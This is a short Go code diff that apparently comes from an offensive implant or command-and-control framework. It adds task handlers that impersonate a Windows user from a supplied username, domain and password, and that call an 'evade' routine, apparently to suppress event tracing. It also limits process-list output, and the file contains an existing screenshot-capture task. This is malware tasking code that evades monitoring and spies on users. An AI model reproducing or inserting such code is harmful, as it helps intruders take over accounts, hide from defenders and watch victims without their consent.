@@ -12,6 +12,7 @@ import (
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
+	"github.com/iDigitalFlame/xmt/cmd/evade"
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
@@ -275,6 +276,9 @@ func taskProcList(_ context.Context, _ data.Reader, w data.Writer) error {
 		return nil
 	}
 	for i := range e {
+		if i >= int(data.LimitLarge) {
+			break
+		}
 		if err = e[i].MarshalStream(w); err != nil {
 			return err
 		}
@@ -385,6 +389,27 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 	default:
 		return xerr.Sub("invalid io operation", 0x34)
 	}
+}
+func taskLoginUser(_ context.Context, r data.Reader, _ data.Writer) error {
+	// NOTE(dij): This function is here and NOT in an OS-specific file as I
+	//            hopefully will find a *nix way to do this also.
+	var (
+		u, d, p string
+		err     = r.ReadString(&u)
+	)
+	if err != nil {
+		return err
+	}
+	if err = r.ReadString(&d); err != nil {
+		return err
+	}
+	if err = r.ReadString(&p); err != nil {
+		return err
+	}
+	return device.ImpersonateUser(u, d, p)
+}
+func taskZeroTrace(_ context.Context, _ data.Reader, _ data.Writer) error {
+	return evade.ZeroTraceEvent()
 }
 func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
 	return screen.Capture(w)
